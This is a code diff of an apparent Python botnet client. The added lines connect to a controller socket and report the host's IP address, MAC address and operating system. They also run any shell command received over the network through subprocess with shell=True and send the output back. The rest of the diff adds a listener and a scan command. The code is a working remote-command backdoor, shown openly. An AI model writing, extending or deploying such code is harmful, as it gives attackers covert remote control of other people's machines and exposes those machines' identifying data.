@@ -1,10 +1,10 @@
 import socket
 import threading
 import platform
-import sys
 from uuid import getnode as get_mac
-from subprocess import call
+import subprocess
 
+# ---------- BOT INIT ---------- #
 send_host = '127.0.0.1'
 send_port = 9990
 
@@ -15,10 +15,36 @@ ip = socket.gethostbyname(socket.gethostname())
 mac = hex(get_mac())
 os = platform.platform()
 
+# create a socket object
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# connect the client
+client.connect((send_host, send_port))
+
+client.send('[*-->online')
+if client.recv(1024) == '[*-->ok':
+    client.send(ip)
+    client.send(mac)
+    client.send(os)
+
+# ---------- END BOT INIT ---------- #
+
 
 def execute_cmd(the_client):
+    the_client.send('[*-->ok')
+
     cmd = the_client.recv(1024)
-    call(cmd)
+    op = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    if op:
+        the_client.send('[*-->success')
+        output = str(op.stdout.read())
+        print "Output:", output
+        client.sendall(output)
+    else:
+        the_client.send('[*-->failure')
+        error = str(op.stderr.read())
+        print "Error:", error
+        client.sendall(error)
 
 
 def send_file(the_client):
@@ -70,7 +96,7 @@ def run_scan():
 # 5 is max backlogged connections
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((bind_host, bind_port))
-server.listen(5)
+server.listen(10)
 
 
 def handle_client(client_socket):
@@ -88,7 +114,7 @@ def handle_client(client_socket):
     if request == '[*-->cmd':
         execute_cmd(client_socket)
 
-    if request == '[*-->ping':
+    if request == '[*-->scan':
         run_scan()
 
     client_socket.close()
